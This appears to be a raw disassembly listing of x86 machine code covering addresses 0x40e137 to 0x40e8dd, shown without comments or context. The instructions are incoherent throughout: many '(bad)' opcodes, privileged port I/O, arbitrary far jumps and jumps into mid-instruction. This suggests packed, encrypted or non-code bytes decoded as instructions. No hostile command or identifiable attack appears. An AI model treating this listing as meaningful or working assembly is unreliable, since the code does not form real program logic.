  40e137:	mov    BYTE PTR [eax-0x1a73f56],al
  40e13d:	stc    
  40e13e:	sub    ebx,0xb01454b9
  40e144:	in     al,0xa1
  40e146:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e147:	jb     0x40e15c
  40e149:	jae    0x40e137
  40e14b:	cmp    eax,0x7f062a7d
  40e150:	pop    ecx
  40e151:	jbe    0x40e18b
  40e153:	lds    edx,FWORD PTR [bx]
  40e156:	shl    BYTE PTR [eax+0x7e],1
  40e159:	jmp    0x6b7f:0x5f2597ce
  40e160:	dec    esi
  40e161:	hlt    
  40e162:	cmp    DWORD PTR [ebp-0x1c],eax
  40e165:	sbb    BYTE PTR [ebp-0x48621c23],al
  40e16b:	fcmovnu st,st(7)
  40e16d:	xchg   esp,eax
  40e16e:	leave  
  40e16f:	jp     0x40e112
  40e171:	mov    esi,0xd8479eeb
  40e176:	loopne 0x40e142
  40e178:	out    0x0,eax
	...
  40e1be:	add    BYTE PTR [edx-0x406b4a4f],bl
  40e1c4:	xchg   esp,eax
  40e1c5:	mov    ebx,0x5d8b00bf
  40e1ca:	sbb    ebx,ebx
  40e1cc:	mov    bh,0xe1
  40e1ce:	mov    ds:0xe8a3,eax
  40e1d3:	and    al,BYTE PTR [edi]
  40e1d5:	add    BYTE PTR [eax],al
  40e1d7:	adc    edi,esi
  40e1d9:	scas   al,BYTE PTR es:[edi]
  40e1da:	sub    eax,0xbc22655f
  40e1df:	xchg   BYTE PTR [edi+0x55a270e4],bh
  40e1e5:	das    
  40e1e6:	jb     0x40e1a2
  40e1e8:	jecxz  0x40e1f2
  40e1ea:	pop    eax
  40e1eb:	cli    
  40e1ec:	pop    edx
  40e1ed:	sahf   
  40e1ee:	cli    
  40e1ef:	sub    ebp,ebx
  40e1f1:	aam    0x5e
  40e1f3:	in     al,dx
  40e1f4:	neg    BYTE PTR ds:0x1b01b1a5
  40e1fa:	sbb    BYTE PTR [eax+edi*4],ch
  40e1fd:	cld    
  40e1fe:	dec    edi
  40e1ff:	jecxz  0x40e279
  40e201:	leave  
  40e202:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e203:	out    0x43,eax
  40e205:	(bad)  
  40e206:	ja     0x40e1fb
  40e208:	push   ss
  40e209:	pop    ss
  40e20a:	jno    0x40e1f6
  40e20c:	xchg   esp,eax
  40e20d:	jbe    0x40e1d0
  40e20f:	jo     0x40e226
  40e211:	sbb    esi,DWORD PTR [edx+eiz*1-0x6d92bb3c]
  40e218:	into   
  40e219:	ror    DWORD PTR [ebx],1
  40e21b:	or     eax,0x335eb208
  40e220:	fldenv [ecx+0x16780201]
  40e226:	pop    ebp
  40e227:	scas   eax,DWORD PTR es:[edi]
  40e228:	add    BYTE PTR [edx],ah
  40e22a:	mov    esp,0x41c1ad17
  40e22f:	pop    edx
  40e230:	xchg   ebp,eax
  40e231:	pop    ebx
  40e232:	mov    ds:0x2de9f29e,al
  40e237:	mov    al,ds:0x70c092cf
  40e23c:	mov    ebp,0x285fddcc
  40e241:	stos   BYTE PTR es:[edi],al
  40e242:	pop    esi
  40e243:	ins    DWORD PTR es:[edi],dx
  40e244:	inc    esi
  40e245:	cli    
  40e246:	or     al,BYTE PTR ss:[ebx+0x89ef75c]
  40e24d:	mov    ?,eax
  40e24f:	in     eax,dx
  40e250:	cmp    BYTE PTR [ebx],ah
  40e252:	lahf   
  40e253:	fwait
  40e254:	in     eax,dx
  40e255:	retf   0xc2d9
  40e258:	jmp    0x40e2b2
  40e25a:	inc    edi
  40e25b:	xlat   BYTE PTR ds:[ebx]
  40e25c:	(bad)  
  40e25e:	xor    cl,BYTE PTR [ebx+ebp*4+0x62]
  40e262:	inc    esi
  40e263:	or     al,0xff
  40e265:	leave  
  40e266:	adc    esp,esp
  40e268:	mov    bl,dl
  40e26a:	xchg   ebp,eax
  40e26b:	jmp    0x40e2c0
  40e26d:	cmp    esi,edi
  40e26f:	inc    edx
  40e270:	sub    cl,BYTE PTR [edx-0x7]
  40e273:	imul   edi,DWORD PTR [edi-0x3a],0x1
  40e277:	add    eax,0xa991272a
  40e27c:	inc    eax
  40e27d:	xchg   ebx,eax
  40e27e:	xor    ah,ch
  40e280:	mov    WORD PTR [ebp+edx*8-0x59c390ce],es
  40e287:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e288:	test   DWORD PTR [eax+0x3a463c7d],ebp
  40e28e:	imul   esp,DWORD PTR [ebx-0x67f3fd71],0xffffff80
  40e295:	dec    ecx
  40e296:	jns    0x40e246
  40e298:	pop    ss
  40e299:	aas    
  40e29a:	pop    es
  40e29b:	loop   0x40e2f9
  40e29d:	scas   al,BYTE PTR es:[edi]
  40e29e:	test   eax,0x6309dcc2
  40e2a3:	or     BYTE PTR [ebp-0x2553f761],bh
  40e2a9:	ins    BYTE PTR es:[edi],dx
  40e2aa:	fdivr  DWORD PTR [edi]
  40e2ac:	mov    ch,0xb3
  40e2ae:	inc    edx
  40e2af:	push   edx
  40e2b0:	push   es
  40e2b1:	loopne 0x40e311
  40e2b3:	aam    0x88
  40e2b5:	pop    edx
  40e2b6:	mov    esi,esp
  40e2b8:	xchg   esi,eax
  40e2b9:	and    ecx,DWORD PTR [esi+0x59e4d800]
  40e2bf:	inc    BYTE PTR [eax+0x15]
  40e2c2:	test   BYTE PTR [edx+0x5224a4e5],dl
  40e2c8:	and    BYTE PTR ds:0xb0f8afa1,al
  40e2ce:	xor    DWORD PTR [edx],ebp
  40e2d0:	jmp    0xb713:0x89cc4bca
  40e2d7:	mov    dl,0x21
  40e2d9:	lea    edi,[ebp-0x553ac5b6]
  40e2df:	aad    0x8a
  40e2e1:	sbb    eax,DWORD PTR [esi]
  40e2e3:	add    al,0xa0
  40e2e5:	sti    
  40e2e6:	std    
  40e2e7:	mov    ch,cl
  40e2e9:	fcom   DWORD PTR [esi-0x6fdedf36]
  40e2ef:	cs popa 
  40e2f1:	pop    eax
  40e2f2:	(bad)
  40e2f5:	adc    eax,ecx
  40e2f7:	(bad)  
  40e2f8:	xor    bl,ah
  40e2fa:	push   cs
  40e2fb:	loope  0x40e2cc
  40e2fd:	shl    DWORD PTR [ebx-0x1b],1
  40e300:	mov    eax,0xb9cbfd6c
  40e305:	adc    BYTE PTR [edi+ecx*4],dl
  40e308:	jp     0x40e2af
  40e30a:	mov    ah,0xf2
  40e30c:	inc    ecx
  40e30d:	push   0x4a
  40e30f:	mov    al,0x99
  40e311:	sbb    dh,al
  40e313:	push   cs
  40e314:	inc    esi
  40e315:	es xchg esp,eax
  40e317:	add    bh,BYTE PTR [ebx-0x8]
  40e31a:	in     eax,0x8e
  40e31c:	loop   0x40e330
  40e31e:	jmp    0xe027427f
  40e323:	jge    0x40e31b
  40e325:	inc    ebp
  40e326:	fwait
  40e327:	(bad)
  40e32a:	scas   eax,DWORD PTR es:[edi]
  40e32b:	inc    ebp
  40e32c:	outs   dx,BYTE PTR ds:[esi]
  40e32d:	pop    ecx
  40e32e:	mov    ds:0x30d42e11,al
  40e333:	mov    bh,0x78
  40e335:	cmp    eax,0x4462522
  40e33a:	out    dx,eax
  40e33b:	out    0xea,al
  40e33d:	or     DWORD PTR [eax+0x7d],ebp
  40e340:	adc    eax,0x3f0e558d
  40e345:	fbstp  TBYTE PTR [esi]
  40e347:	xchg   DWORD PTR [ebx],esi
  40e349:	test   eax,0x95bba572
  40e34e:	pusha  
  40e34f:	xchg   esp,ebp
  40e351:	push   ds
  40e352:	push   cs
  40e353:	and    BYTE PTR [eax],al
  40e355:	repz sbb cl,BYTE PTR [edx]
  40e358:	(bad)  
  40e359:	sbb    DWORD PTR [eax],ebx
  40e35b:	sbb    eax,0xa2690813
  40e360:	push   0xe
  40e362:	or     eax,DWORD PTR [edx]
  40e364:	push   ecx
  40e365:	in     eax,dx
  40e366:	sbb    al,0xab
  40e368:	jns    0x40e3e1
  40e36a:	fst    st(6)
  40e36c:	mov    ecx,0x7d1635e1
  40e371:	dec    esp
  40e372:	test   eax,0x5e959247
  40e377:	xor    BYTE PTR [ebx-0x7e],dl
  40e37a:	call   FWORD PTR [edx-0x8268ae]
  40e380:	mov    eax,ds:0x32c5559e
  40e385:	xchg   ebx,eax
  40e386:	jg     0x40e35f
  40e388:	in     al,dx
  40e389:	mov    WORD PTR [eax],?
  40e38b:	sub    DWORD PTR [eax-0x4d],eax
  40e38e:	inc    ebp
  40e38f:	jne    0x40e35d
  40e391:	in     al,0x53
  40e393:	push   DWORD PTR [edx+0x55]
  40e396:	fsubr  DWORD PTR [eax]
  40e398:	xor    BYTE PTR [ecx],dh
  40e39a:	mov    eax,ds:0x12fe4c72
  40e39f:	dec    ecx
  40e3a0:	xchg   BYTE PTR [esi+0x49],cl
  40e3a3:	repz xchg esp,eax
  40e3a5:	retf   0x74f9
  40e3a8:	shr    dl,1
  40e3aa:	or     ah,BYTE PTR [ebx+0x73139567]
  40e3b0:	sbb    BYTE PTR [ebx],dl
  40e3b2:	cmc    
  40e3b3:	cwde   
  40e3b4:	in     eax,0x31
  40e3b6:	dec    ebx
  40e3b7:	push   edi
  40e3b8:	sar    ebp,1
  40e3ba:	outs   dx,BYTE PTR ds:[esi]
  40e3bb:	mov    ds:0x20279ad3,al
  40e3c0:	push   0xca7e3a62
  40e3c5:	jb     0x40e388
  40e3c7:	outs   dx,DWORD PTR ds:[esi]
  40e3c8:	pop    esi
  40e3c9:	test   DWORD PTR [ebx+0x7e9c9220],esi
  40e3cf:	inc    esi
  40e3d0:	xchg   esi,eax
  40e3d1:	adc    eax,0x799ea4ae
  40e3d6:	xor    BYTE PTR [edx],ah
  40e3d8:	dec    edi
  40e3d9:	jns    0x40e43b
  40e3db:	mov    cl,0xc4
  40e3dd:	mov    bh,al
  40e3df:	cmp    ecx,DWORD PTR [ecx+edi*1]
  40e3e2:	test   eax,0xe2def3c0
  40e3e7:	lsl    ecx,ax
  40e3ea:	sbb    BYTE PTR [edx+0x12],bl
  40e3ed:	mov    esi,0x727da9d3
  40e3f2:	or     BYTE PTR [edi],0x59
  40e3f5:	test   eax,0xf71f1973
  40e3fa:	call   DWORD PTR [ebx]
  40e3fc:	and    eax,0xe0fb699
  40e401:	fist   WORD PTR [esi]
  40e403:	xlat   BYTE PTR ds:[ebx]
  40e404:	adc    eax,0xd0927b0e
  40e409:	ins    DWORD PTR es:[edi],dx
  40e40a:	sub    al,0x3b
  40e40c:	mov    al,ds:0xd3f92f55
  40e411:	push   esi
  40e412:	add    eax,0xf63ad7a8
  40e417:	xchg   BYTE PTR [eax+0x66],dh
  40e41a:	(bad)  
  40e41b:	pop    esi
  40e41c:	retf   
  40e41d:	dec    esp
  40e41e:	je     0x40e3a1
  40e420:	repnz test ebp,esi
  40e423:	fldenv [ecx+ebp*8-0x314b2230]
  40e42a:	jmp    0x7f12:0x231f0b7c
  40e431:	mov    dh,0x8c
  40e433:	neg    BYTE PTR [esp+esi*8]
  40e436:	cs out 0xb9,eax
  40e439:	loop   0x40e44e
  40e43b:	or     eax,0xff24f6ac
  40e440:	push   esp
  40e441:	inc    edx
  40e442:	ror    DWORD PTR [ebx-0x3a],1
  40e445:	mov    bh,0xe1
  40e447:	arpl   bp,cx
  40e449:	push   ds
  40e44a:	fsubr  QWORD PTR [ebx-0x48]
  40e44d:	mov    ah,0xd7
  40e44f:	cs gs mov ?,esp
  40e453:	sub    esi,eax
  40e455:	pop    ebx
  40e456:	data16 mov ah,0x92
  40e459:	inc    esi
  40e45a:	dec    esp
  40e45b:	(bad)  
  40e45d:	out    dx,al
  40e45e:	stos   BYTE PTR es:[edi],al
  40e45f:	int3   
  40e460:	push   edx
  40e461:	int3   
  40e462:	pop    ecx
  40e463:	(bad)  
  40e464:	cs es dec esi
  40e467:	jg     0x40e44d
  40e469:	lods   al,BYTE PTR ds:[esi]
  40e46a:	jbe    0x40e3f1
  40e46c:	test   DWORD PTR [ebx],eax
  40e46e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e46f:	cmp    BYTE PTR [ebx],0x98
  40e472:	sub    dl,ch
  40e474:	icebp  
  40e475:	push   ebp
  40e476:	inc    esi
  40e477:	xchg   ebx,eax
  40e478:	sbb    BYTE PTR [ebx-0x3b064465],0xa1
  40e47f:	fisttp QWORD PTR [ecx-0x168d87b5]
  40e485:	(bad)  
  40e486:	xchg   esp,eax
  40e487:	test   al,0x70
  40e489:	cmp    DWORD PTR [esi-0x1584173b],esp
  40e48f:	inc    esp
  40e490:	jbe    0x40e429
  40e492:	add    al,0x2
  40e494:	repnz or esi,DWORD PTR [eax+ebp*8]
  40e498:	push   edi
  40e499:	xchg   ecx,eax
  40e49a:	mov    al,ds:0x96664a96
  40e49f:	loopne 0x40e511
  40e4a1:	outs   dx,BYTE PTR ds:[esi]
  40e4a2:	or     eax,edi
  40e4a4:	or     BYTE PTR [edi-0x4cb2e152],0x38
  40e4ab:	and    al,0xb3
  40e4ad:	sbb    DWORD PTR [ecx+0x5f],0x1d
  40e4b1:	push   ecx
  40e4b2:	sbb    BYTE PTR [eax+0xf],0x50
  40e4b6:	lea    ebx,[edx]
  40e4b8:	aam    0x4b
  40e4ba:	cmc    
  40e4bb:	mov    BYTE PTR [edi],bh
  40e4bd:	fcom   st(0)
  40e4bf:	and    bh,BYTE PTR [ebp+0x3e]
  40e4c2:	shl    dl,0x4a
  40e4c5:	les    eax,FWORD PTR [edx]
  40e4c7:	inc    di
  40e4c9:	pop    esp
  40e4ca:	mov    ch,0x2e
  40e4cc:	loope  0x40e4b2
  40e4ce:	pusha  
  40e4cf:	hlt    
  40e4d0:	sub    eax,0x22ec16a8
  40e4d5:	add    ch,BYTE PTR [ebx-0x5e]
  40e4d8:	jae    0x40e45c
  40e4da:	nop
  40e4db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e4dc:	inc    ebx
  40e4dd:	or     ebp,ebx
  40e4df:	in     eax,0x49
  40e4e1:	fdivr  st(1),st
  40e4e3:	hlt    
  40e4e4:	jb     0x40e4bd
  40e4e6:	rcl    DWORD PTR [esi+0x2b],1
  40e4e9:	out    0xfc,eax
  40e4eb:	pop    edx
  40e4ec:	jmp    0x40e54a
  40e4ee:	(bad)  
  40e4ef:	lods   al,BYTE PTR ds:[esi]
  40e4f0:	sbb    eax,0xc07fdd0a
  40e4f5:	sbb    eax,0x6c129044
  40e4fa:	xor    al,0x8d
  40e4fc:	(bad)  
  40e4fd:	mov    edi,0xf9364bc7
  40e502:	sub    esp,ebx
  40e504:	gs adc al,0x94
  40e507:	add    BYTE PTR [ecx],ch
  40e509:	or     eax,0xa4436f01
  40e50e:	push   ecx
  40e50f:	das    
  40e510:	ret    
  40e511:	arpl   WORD PTR [edi],bx
  40e513:	add    eax,0x98749a1b
  40e518:	mov    ebx,eax
  40e51a:	mov    al,ds:0x305217f3
  40e51f:	adc    al,0xb2
  40e521:	in     al,0x3d
  40e523:	sbb    dl,BYTE PTR [eax+0x15]
  40e526:	clc    
  40e527:	jge    0x40e57b
  40e529:	das    
  40e52a:	aaa    
  40e52b:	push   edi
  40e52c:	sti    
  40e52d:	int3   
  40e52e:	pop    ebp
  40e52f:	test   BYTE PTR [edi+eax*8-0x51225e0b],al
  40e536:	mov    esi,edi
  40e538:	lods   al,BYTE PTR ds:[esi]
  40e539:	ret    
  40e53a:	mov    ebx,DWORD PTR [esi+0x1c]
  40e53d:	cmc    
  40e53e:	mul    BYTE PTR [edx+0x79]
  40e541:	sbb    al,0xf6
  40e543:	jno    0x40e51b
  40e545:	mov    eax,ds
  40e547:	(bad)  
  40e548:	daa    
  40e549:	je     0x40e582
  40e54b:	push   ds
  40e54c:	or     ch,BYTE PTR [esi+0x71982f82]
  40e552:	out    dx,eax
  40e553:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e554:	xor    al,0x3c
  40e556:	call   0xe71c7248
  40e55b:	iret   
  40e55c:	jae    0x40e59d
  40e55e:	pop    esp
  40e55f:	xor    BYTE PTR [esi+0x1e],bh
  40e562:	loopne 0x40e588
  40e564:	pop    ebx
  40e565:	mov    ecx,0x7c689d4
  40e56a:	sub    ebx,ecx
  40e56c:	and    BYTE PTR [ebx+ebp*2-0x562b36a2],0xc2
  40e574:	mov    esi,0xcc561e98
  40e579:	pop    eax
  40e57a:	xor    DWORD PTR [eax],ecx
  40e57c:	xchg   esp,eax
  40e57d:	add    edx,DWORD PTR [eax+edx*4+0x66]
  40e581:	xor    esi,eax
  40e583:	out    dx,al
  40e584:	out    0x3e,al
  40e586:	lahf   
  40e587:	sahf   
  40e588:	add    eax,0x611920dd
  40e58d:	ficomp DWORD PTR [ecx]
  40e58f:	inc    ecx
  40e590:	pop    esp
  40e591:	out    dx,al
  40e592:	jno    0x40e538
  40e594:	add    BYTE PTR [esi],bh
  40e596:	xchg   esp,eax
  40e597:	cmp    esp,edi
  40e599:	test   eax,edi
  40e59b:	push   ss
  40e59c:	cli    
  40e59d:	aaa    
  40e59e:	cdq    
  40e59f:	dec    edx
  40e5a0:	bound  ebp,QWORD PTR [esi-0x4]
  40e5a3:	out    0x58,eax
  40e5a5:	mov    DWORD PTR [eax-0x54],eax
  40e5a8:	sub    al,0xe5
  40e5aa:	loopne 0x40e539
  40e5ac:	cmc    
  40e5ad:	jmp    0x1f31:0xb5fd5abb
  40e5b4:	mov    dl,0x65
  40e5b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e5b7:	inc    ebx
  40e5b8:	out    dx,al
  40e5b9:	fmul   DWORD PTR [ebx]
  40e5bb:	cmp    bl,BYTE PTR [edi+0x2a]
  40e5be:	pop    ss
  40e5bf:	test   dl,al
  40e5c1:	cwde   
  40e5c2:	repz pop esi
  40e5c4:	adc    BYTE PTR [esi],0x6c
  40e5c7:	fwait
  40e5c8:	pop    es
  40e5c9:	mov    eax,ds:0x10ac645c
  40e5ce:	mov    eax,ds:0x6a848638
  40e5d3:	out    dx,al
  40e5d4:	mov    edi,DWORD PTR [ebx-0x2a]
  40e5d7:	in     eax,dx
  40e5d8:	jne    0x40e60d
  40e5da:	sbb    al,0x2e
  40e5dc:	fnsave [ebp+0x1f]
  40e5df:	cmp    ah,BYTE PTR [ebp-0x5709d057]
  40e5e5:	test   eax,0x2a8f10e0
  40e5eb:	cli    
  40e5ec:	cmc    
  40e5ed:	loop   0x40e5a3
  40e5ef:	xchg   edi,eax
  40e5f0:	add    esp,DWORD PTR [eax+esi*8+0x49]
  40e5f4:	lds    ebx,FWORD PTR [eax+ecx*2+0xa703257]
  40e5fb:	adc    ebp,DWORD PTR [eax+ebp*1-0x8920a1e]
  40e602:	ret    
  40e603:	mov    edi,0xf24be304
  40e608:	scas   eax,DWORD PTR es:[edi]
  40e609:	dec    esi
  40e60a:	mov    esp,0xa1a7b2a6
  40e60f:	je     0x40e62e
  40e611:	popf   
  40e612:	push   edx
  40e613:	bswap  esi
  40e615:	jb     0x40e5ff
  40e617:	loop   0x40e695
  40e619:	imul   BYTE PTR [ebp-0x60dd854]
  40e61f:	gs jl  0x40e661
  40e622:	stc    
  40e623:	xchg   BYTE PTR [esi+eax*1+0x21],bl
  40e627:	loop   0x40e693
  40e629:	xor    eax,ebx
  40e62b:	push   ecx
  40e62c:	daa    
  40e62d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e62e:	mov    esi,0x7270ee96
  40e633:	inc    ebx
  40e634:	jae    0x40e635
  40e636:	popa   
  40e637:	xor    DWORD PTR [edx],ebp
  40e639:	dec    esi
  40e63a:	popa   
  40e63b:	ss into 
  40e63d:	das    
  40e63e:	rol    BYTE PTR [ebx+0x3679fec9],1
  40e644:	test   eax,0xdf188849
  40e649:	adc    DWORD PTR [esi-0x28],ebp
  40e64c:	ds pop es
  40e64e:	mov    edi,0x77753865
  40e653:	daa    
  40e654:	js     0x40e64f
  40e656:	push   0xffffffed
  40e658:	sub    BYTE PTR [edi+0x2a],bl
  40e65b:	enter  0x52f9,0x9b
  40e65f:	pop    edx
  40e660:	ret    
  40e661:	xchg   ebp,eax
  40e662:	mov    bh,0xa2
  40e664:	inc    eax
  40e665:	lods   eax,DWORD PTR ds:[esi]
  40e666:	sub    al,0x72
  40e668:	int    0x19
  40e66a:	jae    0x40e6e5
  40e66c:	fs dec eax
  40e66e:	sub    BYTE PTR [ebx-0x418d88c9],dh
  40e674:	sbb    BYTE PTR [ecx-0xdf61c7e],0x88
  40e67b:	or     DWORD PTR [ecx+edi*4-0x62],edx
  40e67f:	dec    edi
  40e680:	or     eax,0xd2ba867f
  40e685:	arpl   WORD PTR [edx+0x39],bp
  40e688:	pop    ebp
  40e689:	(bad)  
  40e68a:	adc    ah,al
  40e68c:	xchg   esp,eax
  40e68d:	(bad)  
  40e68e:	xchg   esp,eax
  40e68f:	and    BYTE PTR [ecx],dl
  40e691:	sbb    eax,0xeb0579c
  40e696:	adc    ebp,esi
  40e698:	pop    esi
  40e699:	stos   BYTE PTR es:[edi],al
  40e69a:	enter  0x949d,0x18
  40e69e:	xor    eax,0x71946b8a
  40e6a3:	pop    esi
  40e6a4:	xchg   ecx,eax
  40e6a5:	or     BYTE PTR [edx+0x2b],dh
  40e6a8:	jb     0x40e6ef
  40e6aa:	lds    esi,FWORD PTR [eax+0x5ad113e1]
  40e6b0:	out    0x3e,al
  40e6b2:	fnstenv [eax-0x27]
  40e6b5:	std    
  40e6b6:	inc    BYTE PTR [edx+edx*4-0x3d5b443b]
  40e6bd:	outs   dx,DWORD PTR ds:[esi]
  40e6be:	div    BYTE PTR [esi+0x4a]
  40e6c1:	ins    BYTE PTR es:[edi],dx
  40e6c2:	je     0x40e6d3
  40e6c4:	jns    0x40e6dc
  40e6c6:	addr16 je 0x40e664
  40e6c9:	or     ecx,edi
  40e6cb:	xchg   edi,eax
  40e6cc:	mul    ebx
  40e6ce:	sub    cl,BYTE PTR [ecx+eiz*1+0x4d319d4c]
  40e6d5:	cmp    eax,0xf13c8176
  40e6da:	scas   eax,DWORD PTR es:[edi]
  40e6db:	jns    0x40e681
  40e6dd:	xchg   edi,eax
  40e6de:	ficom  DWORD PTR [esi]
  40e6e0:	mov    bl,0x3
  40e6e2:	test   BYTE PTR [eax-0x6],bl
  40e6e5:	xchg   ebp,eax
  40e6e6:	jns    0x40e6fa
  40e6e8:	adc    eax,0x83d190e
  40e6ed:	ja     0x40e6bc
  40e6ef:	sti    
  40e6f0:	(bad)  
  40e6f1:	clc    
  40e6f2:	das    
  40e6f3:	bound  ecx,QWORD PTR [ebp+0x5ac72cf4]
  40e6f9:	retf   
  40e6fa:	xchg   ah,dh
  40e6fc:	loope  0x40e77a
  40e6fe:	outs   dx,DWORD PTR ds:[esi]
  40e6ff:	or     DWORD PTR [edi-0xc],edx
  40e702:	cmp    ebp,DWORD PTR [edi]
  40e704:	mov    BYTE PTR [eax],ch
  40e706:	pop    esi
  40e707:	pop    ebp
  40e708:	mov    dl,0x88
  40e70a:	sbb    BYTE PTR [edx+0x55d3f2f3],al
  40e710:	push   ss
  40e711:	push   ecx
  40e712:	inc    esi
  40e713:	mov    eax,0x1fb359f6
  40e718:	ret    
  40e719:	cdq    
  40e71a:	test   BYTE PTR [ebx-0x27],bh
  40e71d:	mov    ch,0x5e
  40e71f:	imul   edx,ecx,0xffffff9c
  40e722:	aam    0x2a
  40e724:	in     eax,dx
  40e725:	jp     0x40e6f4
  40e727:	(bad)
  40e72a:	xchg   DWORD PTR [eax],ebx
  40e72c:	and    esp,edx
  40e72e:	popf   
  40e72f:	pop    eax
  40e730:	push   0xffffffb4
  40e732:	ds inc esp
  40e734:	sub    ebx,DWORD PTR [esi-0x714fb863]
  40e73a:	jns    0x40e78e
  40e73c:	aaa    
  40e73d:	into   
  40e73e:	imul   ecx,DWORD PTR [ebx+0x2ee33a10],0xffffffdb
  40e745:	test   BYTE PTR [eax],ch
  40e747:	pop    es
  40e748:	inc    ebp
  40e749:	pop    es
  40e74a:	cmc    
  40e74b:	xor    ecx,ebp
  40e74d:	shl    BYTE PTR [ebp-0x6f9abb0a],1
  40e753:	aas    
  40e754:	push   edx
  40e755:	pop    ebp
  40e756:	cs mov eax,0x83ed875c
  40e75c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e75d:	pop    eax
  40e75e:	mov    ch,BYTE PTR [edi+0x7e]
  40e761:	jp     0x40e7b4
  40e763:	jbe    0x40e6ea
  40e765:	cmp    al,0xb9
  40e767:	into   
  40e768:	push   ds
  40e769:	dec    ebp
  40e76a:	adc    BYTE PTR [esi+ecx*2+0x4924c9cf],bh
  40e771:	add    eax,0x72b23189
  40e776:	std    
  40e777:	jecxz  0x40e7f7
  40e779:	push   ebp
  40e77a:	push   0xe6284237
  40e77f:	rol    BYTE PTR [ecx],cl
  40e781:	je     0x40e713
  40e783:	popf   
  40e784:	frstor [si+0x7c86]
  40e789:	(bad)  
  40e78a:	pop    ecx
  40e78b:	fiadd  DWORD PTR [edx-0x15]
  40e78e:	fadd   QWORD PTR [edx+0x4c8900f4]
  40e794:	add    BYTE PTR [esi],bh
  40e796:	jmp    0x63ac:0x1d0057e6
  40e79d:	ins    DWORD PTR es:[edi],dx
  40e79e:	mov    eax,ds:0xbf5857e0
  40e7a3:	push   ss
  40e7a4:	enter  0xf3ea,0x1d
  40e7a8:	sbb    ch,BYTE PTR [esi+0x54]
  40e7ab:	sub    eax,0x7ba359d5
  40e7b0:	mov    ecx,0xe2970c73
  40e7b5:	sbb    eax,0xcf85a924
  40e7ba:	inc    ebp
  40e7bb:	inc    esp
  40e7bc:	xchg   edi,eax
  40e7bd:	dec    esi
  40e7be:	fs aad 0x6b
  40e7c1:	ins    DWORD PTR es:[edi],dx
  40e7c2:	mov    DWORD PTR [eax+0x1a2f4786],edx
  40e7c8:	push   eax
  40e7c9:	add    bh,dl
  40e7cb:	cmp    esp,DWORD PTR ds:0x5dca11ee
  40e7d1:	cmp    cl,BYTE PTR [esi+ebp*8+0x41ca59df]
  40e7d8:	ror    DWORD PTR [ecx],0x19
  40e7db:	pop    edx
  40e7dc:	push   eax
  40e7dd:	jecxz  0x40e77b
  40e7df:	mov    DWORD PTR [edx-0x5a],edx
  40e7e2:	mov    dh,0xe
  40e7e4:	test   eax,0x56a06680
  40e7e9:	push   edx
  40e7ea:	or     dl,BYTE PTR [ebp-0x43]
  40e7ed:	pop    ss
  40e7ee:	sbb    esi,DWORD PTR [ecx+0x70]
  40e7f1:	mov    edx,gs
  40e7f3:	int3   
  40e7f4:	sbb    al,0x3d
  40e7f6:	push   ebp
  40e7f7:	imul   ecx,edx,0x8
  40e7fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e7fb:	cmp    eax,0x97a30b66
  40e800:	ret    0x8008
  40e803:	and    al,0xf5
  40e805:	cli    
  40e806:	test   ecx,0xd33e4c4b
  40e80c:	xchg   esp,eax
  40e80d:	(bad)  
  40e80e:	mov    ecx,0x778a9ddd
  40e813:	jg     0x40e7f5
  40e815:	je     0x40e86f
  40e817:	adc    BYTE PTR [ebx+0x7ecf1df0],dh
  40e81d:	inc    edx
  40e81e:	cdq    
  40e81f:	dec    eax
  40e820:	push   es
  40e821:	sub    esp,DWORD PTR ds:0x503e9965
  40e827:	pop    eax
  40e828:	xchg   ecx,eax
  40e829:	sbb    BYTE PTR [edi],0x8b
  40e82c:	adc    esp,DWORD PTR [ecx+0x35]
  40e82f:	shl    DWORD PTR [edx+0xe1527bd],0x1b
  40e836:	jp     0x40e7d6
  40e838:	fstp   QWORD PTR [eax+0x74d98b03]
  40e83e:	outs   dx,BYTE PTR ds:[esi]
  40e83f:	dec    ebx
  40e840:	adc    al,0xd9
  40e842:	inc    edx
  40e843:	add    al,0x58
  40e845:	pop    ss
  40e846:	call   0xa0a1f0d0
  40e84b:	pop    esp
  40e84c:	mov    al,0x26
  40e84e:	cmc    
  40e84f:	mov    al,ds:0x6b628a05
  40e854:	test   al,0x18
  40e856:	in     eax,0xb3
  40e858:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e859:	inc    edx
  40e85a:	sbb    eax,0x2896c096
  40e85f:	loop   0x40e8dd
  40e861:	rol    DWORD PTR [ebx-0x7ad61f13],1
  40e867:	retf   
  40e868:	pusha  
  40e869:	mov    al,cs:0x2c09df1c
  40e86f:	pop    es
  40e870:	mov    cl,0xec
  40e872:	fnstcw WORD PTR [ebp+edi*1-0x58]
  40e876:	sub    al,0x8d
  40e878:	adc    dh,0x9
  40e87b:	call   0x99cff02d
  40e880:	xchg   ebx,eax
  40e881:	(bad)  
  40e882:	mov    ds:0xc4dae550,eax
  40e887:	cs adc al,0xe5
  40e88a:	mov    edx,0x8e52b699
  40e88f:	and    eax,0x8a0d64f7
  40e894:	dec    edi
  40e895:	mov    bl,BYTE PTR [edi-0xe8647ce]
  40e89b:	call   0x6e2d:0xe62d05a7
  40e8a2:	jmp    0x60fb2907
  40e8a7:	cmp    eax,0x8beb86f4
  40e8ac:	ins    BYTE PTR es:[edi],dx
  40e8ad:	pop    ecx
  40e8ae:	mov    eax,ds:0x6365c3d2
  40e8b3:	nop
  40e8b4:	arpl   WORD PTR [ecx],dx
  40e8b6:	mov    eax,fs
  40e8b8:	fst    QWORD PTR [eax]
  40e8ba:	test   al,0x90
  40e8bc:	jp     0x40e867
  40e8be:	mov    ds:0xbb09a769,eax
  40e8c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e8c4:	shl    BYTE PTR [ebx+0x67dc8621],0xf7
  40e8cb:	sub    DWORD PTR [bp+di-0x2e],0xbb10ac7b
  40e8d3:	les    edx,FWORD PTR [ebx-0xb7bf440]
  40e8d9:	test   BYTE PTR [ecx+0x64],0x67
  40e8dd:	gs in  al,dx
